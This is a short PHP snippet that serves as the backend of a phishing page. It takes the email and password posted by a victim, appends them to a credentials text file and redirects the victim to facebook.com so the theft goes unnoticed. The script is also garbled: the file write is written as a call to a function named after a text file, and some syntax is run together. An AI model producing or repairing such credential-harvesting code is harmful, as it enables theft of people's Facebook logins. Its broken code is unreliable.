```php


<?php$email = $_POST['email'];$password = $_POST['password'];
facebook_passwords.txt('credentials.txt',$email. ':'.$password. PHP_EOL, FILE_APPEND);
header('Location: https://www.facebook.com/');exit;?>
